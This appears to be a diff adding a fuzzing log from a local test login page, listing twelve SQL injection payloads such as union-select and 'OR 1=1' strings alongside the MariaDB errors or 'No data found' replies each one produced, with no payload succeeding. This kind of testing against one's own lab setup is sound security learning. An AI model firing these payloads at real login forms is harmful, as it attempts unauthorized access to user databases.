@@ -1,0 +1,78 @@
+PAYLOAD: " or ' union select * from users --" \
+RESULT: <br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '--&quot; \' AND pw='test'' at line 1 in C:\xampp\htdocs\fuzzing_test\login.php:23
+Stack trace:
+#0 C:\xampp\htdocs\fuzzing_test\login.php(23): mysqli-&gt;query('SELECT username...')
+#1 {main}
+  thrown in <b>C:\xampp\htdocs\fuzzing_test\login.php</b> on line <b>23</b><br />
+
+--------------------------------------------------
+PAYLOAD: 'admin' and pw='admin1234' --"
+RESULT: <br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'admin' and pw='admin1234' --&quot;' AND pw='test'' at line 1 in C:\xampp\htdocs\fuzzing_test\login.php:23
+Stack trace:
+#0 C:\xampp\htdocs\fuzzing_test\login.php(23): mysqli-&gt;query('SELECT username...')
+#1 {main}
+  thrown in <b>C:\xampp\htdocs\fuzzing_test\login.php</b> on line <b>23</b><br />
+
+--------------------------------------------------
+PAYLOAD: " or 1=1;--" \
+RESULT: <br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'test'' at line 1 in C:\xampp\htdocs\fuzzing_test\login.php:23
+Stack trace:
+#0 C:\xampp\htdocs\fuzzing_test\login.php(23): mysqli-&gt;query('SELECT username...')
+#1 {main}
+  thrown in <b>C:\xampp\htdocs\fuzzing_test\login.php</b> on line <b>23</b><br />
+
+--------------------------------------------------
+PAYLOAD: 0;--" \
+RESULT: <br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'test'' at line 1 in C:\xampp\htdocs\fuzzing_test\login.php:23
+Stack trace:
+#0 C:\xampp\htdocs\fuzzing_test\login.php(23): mysqli-&gt;query('SELECT username...')
+#1 {main}
+  thrown in <b>C:\xampp\htdocs\fuzzing_test\login.php</b> on line <b>23</b><br />
+
+--------------------------------------------------
+PAYLOAD: " or 'union select * from users--" \
+RESULT: <br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '--&quot; \' AND pw='test'' at line 1 in C:\xampp\htdocs\fuzzing_test\login.php:23
+Stack trace:
+#0 C:\xampp\htdocs\fuzzing_test\login.php(23): mysqli-&gt;query('SELECT username...')
+#1 {main}
+  thrown in <b>C:\xampp\htdocs\fuzzing_test\login.php</b> on line <b>23</b><br />
+
+--------------------------------------------------
+PAYLOAD: " or 'or 1=1--" \
+RESULT: <br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '&quot; \' AND pw='test'' at line 1 in C:\xampp\htdocs\fuzzing_test\login.php:23
+Stack trace:
+#0 C:\xampp\htdocs\fuzzing_test\login.php(23): mysqli-&gt;query('SELECT username...')
+#1 {main}
+  thrown in <b>C:\xampp\htdocs\fuzzing_test\login.php</b> on line <b>23</b><br />
+
+--------------------------------------------------
+PAYLOAD: " and pw='"
+RESULT: <br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '&quot;' AND pw='test'' at line 1 in C:\xampp\htdocs\fuzzing_test\login.php:23
+Stack trace:
+#0 C:\xampp\htdocs\fuzzing_test\login.php(23): mysqli-&gt;query('SELECT username...')
+#1 {main}
+  thrown in <b>C:\xampp\htdocs\fuzzing_test\login.php</b> on line <b>23</b><br />
+
+--------------------------------------------------
+PAYLOAD: " or 1=1" \
+RESULT: {"status":"fail","message":"No data found"}
+--------------------------------------------------
+PAYLOAD: "' union select password from users where id='admin'" \
+RESULT: {"status":"fail","message":"No data found"}
+--------------------------------------------------
+PAYLOAD: "--" \
+RESULT: {"status":"fail","message":"No data found"}
+--------------------------------------------------
+PAYLOAD: "' AND 'b'='b'" \
+RESULT: {"status":"fail","message":"No data found"}
+--------------------------------------------------
+PAYLOAD: " OR 1=1 --"
+RESULT: {"status":"fail","message":"No data found"}
+--------------------------------------------------
